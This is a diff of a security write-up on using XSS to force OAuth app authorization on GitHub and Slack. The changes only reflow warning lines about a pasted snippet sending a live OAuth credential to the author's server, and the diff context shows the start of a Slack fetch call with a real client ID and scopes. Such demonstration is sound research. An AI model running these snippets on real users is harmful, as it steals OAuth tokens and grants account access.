@@ -87,7 +87,8 @@ If you're familiar with Oauth, once the user clicks the authorize button, it gra
 Github has some protections against certain oauth scopes, forcing users to re-enter credentials if they haven't entered them recently, for those Oauth scopes. For this reason, our app requests scopes that do not require credentials. The scopes are email, and read/write Webhooks. This will allow us to install [Webhooks](https://developer.github.com/webhooks/) on repos on behalf of the user.
 
 
-Because Github hosts their Oauth grant on their main domain, XSS anywhere on github.com will allow us to Authorize the app on behalf of the user. To simulate this XSS, one can paste the following into their Javascript terminal **Warning, this will send my server a live Oauth credential. **
+Because Github hosts their Oauth grant on their main domain, XSS anywhere on github.com will allow us to Authorize the app on behalf of the user. To simulate this XSS, one can paste the following into their Javascript terminal 
+**Warning, this will send my server a live Oauth credential.**
 
 Code to paste:
 ```javascript
@@ -111,7 +112,8 @@ With the same technique we can target slack. The following Javascript code force
 
 ![Slack Oauth XSS App](https://i.imgur.com/qQVKLT3.png)
 
-Feel free to again simulate the XSS by pasting the below Javascript into your terminal anywhere on your workspace domain. **Warning, this will send my server a live Oauth credential. **
+Feel free to again simulate the XSS by pasting the below Javascript into your terminal anywhere on your workspace domain.
+ **Warning, this will send my server a live Oauth credential.**
 
 ```javascript
 fetch(location.origin + "/oauth/authorize?scope=channels:history+users.profile:read&client_id=496141141553.514835337734").then(function(response) {
